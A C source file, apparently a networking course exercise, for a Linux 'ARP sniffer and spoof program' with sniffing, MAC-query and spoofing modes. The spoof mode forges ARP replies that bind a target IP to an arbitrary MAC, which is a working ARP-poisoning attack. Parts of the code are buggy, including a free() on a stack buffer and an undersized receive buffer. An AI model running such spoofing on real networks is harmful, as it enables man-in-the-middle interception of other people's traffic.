#include <netinet/if_ether.h> // Structures for Ethernet/ARP
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include "arp.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>  // For IP address conversion (inet_ntop, inet_aton, etc.)
#include <unistd.h>     // For checking effective user ID, etc.


#define DEVICE_NAME "enp0s3"
#define BUF_SIZE 65536


 
 void print_usage() {
    printf("[ ARP sniffer and spoof program ]\n"); // Display help usage
    printf("Format :\n");
    printf("1) ./arp -l -a                    Show all ARP packets\n");
    printf("2) ./arp -l <filter_ip_address>   Filter ARP packets by IP address\n");
    printf("3) ./arp -q <query_ip_address>\n");
    printf("4) ./arp <fake_mac_address> <target_ip_address>\n");
}

// Check if the received packet is an ARP packet
int check_arp_packet(struct arp_packet *arp_pkt) {
    return ntohs(arp_pkt->eth_hdr.ether_type) == ETH_P_ARP;
}

// Process ARP packet with optional IP filter
void process_arp_packet(unsigned char* buffer, const char* filter_ip) {
    struct ether_header* eth = (struct ether_header*)buffer;
    
    if (ntohs(eth->ether_type) == ETHERTYPE_ARP) {
        struct ether_arp* arp = (struct ether_arp*)(buffer + sizeof(struct ether_header));
        
        struct in_addr sender, target;
        memcpy(&sender, arp->arp_spa, sizeof(sender));
        memcpy(&target, arp->arp_tpa, sizeof(target));
    
        char sender_ip[INET_ADDRSTRLEN], target_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &sender, sender_ip, INET_ADDRSTRLEN);
        inet_ntop(AF_INET, &target, target_ip, INET_ADDRSTRLEN);
    
        if (filter_ip == NULL || strcmp(target_ip, filter_ip) == 0) {
            printf("Get ARP packet - Who has %s ? Tell %s \n", target_ip, sender_ip);
        }
  }
}

// Print ARP packet info
void print_arp_packet(struct arp_packet *arp_pkt) {

        printf("Get ARP packet - Who has %s? Tell %s\n",
               inet_ntoa(*(struct in_addr *)&arp_pkt->arp.arp_tpa), 
               inet_ntoa(*(struct in_addr *)&arp_pkt->arp.arp_spa));
        
}

int main(int argc, char *argv[])
{
	int sockfd_recv = 0, sockfd_send = 0; 
	int recv_len;
	struct sockaddr_ll sa; 
	struct ifreq req; 
	struct in_addr myip; 
	struct in_addr target_ip;
	struct arp_packet *arp_pkt;  
        unsigned char my_mac_address[6];
        unsigned char fake_mac[6];
        unsigned char buffer [2048]; // Buffer for sending and receiving
        socklen_t sa_len = sizeof(sa);
        
	// Must run as root
	if (geteuid() != 0) {
        fprintf(stderr, "Error: You must be root to use this tool!\n");
        exit(1);
    }
    
        // Check for -help option
        if (argc > 1 && strcmp(argv[1], "-help") == 0) {
            print_usage();
            exit(0);
	}
	// Open a recv socket in data-link layer
	if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
	    perror("open recv socket error");
	    exit(1);
	}
	
	// Open a send socket in data-link layer
	if((sockfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("open send socket error");
		exit(sockfd_send);
	}

	/*
	 * Use ioctl function binds the send socket and the Network Interface Card.
	 */
	memset(&req, 0, sizeof(req));
        strncpy(req.ifr_name, DEVICE_NAME, IFNAMSIZ);
        if (ioctl(sockfd_send, SIOCGIFINDEX, &req) < 0) {
          perror("ioctl error (gettint MAC address)");
          exit(1);
    }
	
	memcpy(my_mac_address, req.ifr_hwaddr.sa_data,6);
	
        // Get local IP
        if (ioctl(sockfd_send, SIOCGIFADDR, &req) < 0) {
           perror("ioctl error (gettint MAC address)");
            exit(1);
        }
        struct sockaddr_in *addr = (struct sockaddr_in *)&req.ifr_addr;
        myip = addr->sin_addr;

	// Setup sockaddr_ll for sending
	memset(&sa, 0, sizeof(sa));
        sa.sll_family = AF_PACKET;
        sa.sll_ifindex = req.ifr_ifindex;
        sa.sll_protocol = htons(ETH_P_ALL);
        
        // ARP sniffer mode: show all
    if (argc == 3 && strcmp(argv[1], "-l") == 0 && strcmp(argv[2], "-a") == 0) {
        
        printf("[ ARP sniffer and spoof program ]\n");
        printf("### ARP sniffer mode ###\n");
        const char* filter_ip = NULL;       
        
        if (argc == 3 ) {
            filter_ip = NULL;
        }
        
        else if (argc == 3) {
            filter_ip = argv[2];
        }
        else {
            print_usage();
            exit(0);
        }

        // Open another recv socket
	if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
	    perror("open recv socket error");
	    exit(1);
	}

        while (1) {
            recv_len = recvfrom(sockfd_recv, buffer, BUF_SIZE, 0, (struct sockaddr*)&sa, &sa_len);
            if (recv_len < 0) {
                perror("Receive error");
                exit(1);
            }
   
                process_arp_packet(buffer, filter_ip); 
        }
    
    free(buffer);
    return 0;
}
    // ARP sniffer mode: filter by IP
     if (argc == 3 && strcmp(argv[1], "-l") == 0) {
        printf("[ ARP sniffer and spoof program ]\n");
        printf("### ARP sniffer mode ###\n");
        const char* filter_ip = NULL;       
        
        if (argc == 3) {
            filter_ip = argv[2];
        }
        else {
            print_usage();
            exit(0);
        }

        // Open recv socket
	if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
	    perror("open recv socket error");
	    exit(1);
	}

        while (1) {
            recv_len = recvfrom(sockfd_recv, buffer, BUF_SIZE, 0, (struct sockaddr*)&sa, &sa_len);
            if (recv_len < 0) {
                perror("Receive error");
                exit(1);
            }
   
                process_arp_packet(buffer, filter_ip);
        }
    
    free(buffer);
    return 0;
    } 
    
     // Query mode: find MAC of a specific IP
     if (argc == 3 && strcmp(argv[1], "-q") == 0){
    struct in_addr query_ip;
    if (inet_aton(argv[2], &query_ip) ==0) {
        fprintf(stderr, "Invaild IP address format. \n");
        exit(1);
    
    }
     printf("[ ARP sniffer and spoof program ]\n");
     printf("### ARP sniffer mode ###\n");
     
     // Open sockets
	if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
	    perror("open recv socket error");
	    exit(1);
	}
     
	if((sockfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
	{
		perror("open send socket error");
		exit(sockfd_send);
	}
     
     memset(&req, 0, sizeof(req));
     strncpy(req.ifr_name, DEVICE_NAME, IFNAMSIZ);
     if (ioctl(sockfd_send, SIOCGIFINDEX, &req) < 0) {
         perror("ioctl error (getting interface index)");
         exit(1);
     }

        if (ioctl(sockfd_send, SIOCGIFHWADDR, &req) < 0) {
            perror("ioctl error (getting MAC address)");
            exit(1);
        }
        memcpy(my_mac_address, req.ifr_hwaddr.sa_data, 6);

        if (ioctl(sockfd_send, SIOCGIFADDR, &req) < 0) {
            perror("ioctl error (getting IP address)");
            exit(1);
        }
        struct sockaddr_in *addr = (struct sockaddr_in *)&req.ifr_addr;
        myip = addr->sin_addr;
     
    struct ether_header *eh = (struct ether_header *)buffer;
    struct ether_arp *arp_req = (struct ether_arp *)(buffer + sizeof(struct ether_header));

    // Build ARP request
    memset(eh->ether_dhost, 0xff, 6);
    memcpy(eh->ether_shost, my_mac_address, 6);
    eh->ether_type = htons(ETH_P_ARP);

    arp_req->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_req->ea_hdr.ar_pro = htons(ETH_P_IP);
    arp_req->ea_hdr.ar_hln = 6;
    arp_req->ea_hdr.ar_pln = 4;
    arp_req->ea_hdr.ar_op = htons(ARPOP_REQUEST);

    memcpy(arp_req->arp_sha, my_mac_address, 6);
    memcpy(arp_req->arp_spa, &myip, 4);
    memset(arp_req->arp_tha, 0, 6);
    memcpy(arp_req->arp_tpa, &query_ip, 4);

    sa.sll_ifindex = req.ifr_ifindex;
    sa.sll_halen = ETH_ALEN;
    memcpy(sa.sll_addr, my_mac_address, 6);

    if (sendto(sockfd_send, buffer, sizeof(struct ether_header) + sizeof(struct ether_arp), 0, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
        perror("sendto error");
        exit(1);
    
   }

    // Wait for ARP reply
    while (1) {
        recv_len = recvfrom(sockfd_recv, buffer, sizeof(buffer), 0, NULL, NULL);
        if (recv_len < 0) {
            perror("Receive error");
            exit(1);
        }
        
        struct ether_header *eh_recv = (struct ether_header *)buffer;
        struct ether_arp *arp_rep = (struct ether_arp *)(buffer + sizeof(struct ether_header));

        if (ntohs(eh_recv->ether_type) == ETH_P_ARP && ntohs(arp_rep->ea_hdr.ar_op) == ARPOP_REPLY &&
            memcmp(arp_rep->arp_spa, &query_ip, 4) == 0) {
            
            printf("MAC address of %s is %02x:%02x:%02x:%02x:%02x:%02x\n",
                   argv[2],
                   arp_rep->arp_sha[0], arp_rep->arp_sha[1], arp_rep->arp_sha[2],
                   arp_rep->arp_sha[3], arp_rep->arp_sha[4], arp_rep->arp_sha[5]);
            break;
        }
    
     }
     
     close(sockfd_send);
     close(sockfd_recv);
     
    }
    
    // Spoof mode: send fake ARP replies
     if (argc == 3) {
        if (sscanf(argv[1], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &fake_mac[0], &fake_mac[1], &fake_mac[2], &fake_mac[3], &fake_mac[4], &fake_mac[5]) != 6) {
            fprintf(stderr, "Invalid MAC address format.\n");
            exit(1);
        }

        if (inet_aton(argv[2], &target_ip) == 0) {
            fprintf(stderr, "Invalid IP address format.\n");
            exit(1);
        }

        printf("[ ARP spoof program ]\n");
        printf("### ARP spoof mode ###\n");

        if ((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
            perror("open recv socket error");
            exit(1);
        }

        if ((sockfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
            perror("open send socket error");
            exit(sockfd_send);
        }

        memset(&req, 0, sizeof(req));
        strncpy(req.ifr_name, DEVICE_NAME, IFNAMSIZ);
        if (ioctl(sockfd_send, SIOCGIFINDEX, &req) < 0) {
            perror("ioctl error (getting interface index)");
            exit(1);
        }

        // Loop for incoming ARP requests
        while (1) {
            recv_len = recvfrom(sockfd_recv, buffer, sizeof(buffer), 0, NULL, NULL);
            if (recv_len < 0) {
                perror("Receive error");
                exit(1);
            }

            struct ether_header *eth = (struct ether_header *)buffer;
            struct ether_arp *arp_req = (struct ether_arp *)(buffer + sizeof(struct ether_header));

            if (ntohs(eth->ether_type) == ETH_P_ARP && ntohs(arp_req->ea_hdr.ar_op) == ARPOP_REQUEST) {
                struct in_addr sender_ip, target_ip_in_request;
                memcpy(&target_ip_in_request, arp_req->arp_tpa, sizeof(struct in_addr));
                memcpy(&sender_ip, arp_req->arp_spa, sizeof(struct in_addr));

                if (memcmp(&target_ip, &target_ip_in_request, sizeof(struct in_addr)) == 0) {
                    printf("Get ARP packet - Who has %s ? Tell %s\n", inet_ntoa(target_ip), inet_ntoa(sender_ip));

                    struct ether_header *eth_reply = (struct ether_header *)buffer;
                    struct ether_arp *arp_reply = (struct ether_arp *)(buffer + sizeof(struct ether_header));

                    memcpy(eth_reply->ether_dhost, eth->ether_shost, 6);
                    memcpy(eth_reply->ether_shost, fake_mac, 6);
                    eth_reply->ether_type = htons(ETH_P_ARP);

                    arp_reply->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
                    arp_reply->ea_hdr.ar_pro = htons(ETH_P_IP);
                    arp_reply->ea_hdr.ar_hln = 6;
                    arp_reply->ea_hdr.ar_pln = 4;
                    arp_reply->ea_hdr.ar_op = htons(ARPOP_REPLY);

                    memcpy(arp_reply->arp_sha, fake_mac, 6);
                    memcpy(arp_reply->arp_spa, &target_ip, 4);
                    memcpy(arp_reply->arp_tha, arp_req->arp_sha, 6);
                    memcpy(arp_reply->arp_tpa, arp_req->arp_spa, 4);

                    sa.sll_ifindex = req.ifr_ifindex;
                    sa.sll_halen = ETH_ALEN;
                    memcpy(sa.sll_addr, eth_reply->ether_dhost, 6);

                    if (sendto(sockfd_send, buffer, sizeof(struct ether_header) + sizeof(struct ether_arp), 0, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
                        perror("sendto error");
                        exit(1);
                    }

                    printf("Sent ARP Reply : %s is %02x:%02x:%02x:%02x:%02x:%02x\n", argv[2],
                           fake_mac[0], fake_mac[1], fake_mac[2], fake_mac[3], fake_mac[4], fake_mac[5]);
                    printf("Send successful.\n");
                }
            }
        }

        close(sockfd_send);
        close(sockfd_recv);
    } else {
        print_usage();
        exit(1);
    }
    
	return 0;
	
 }

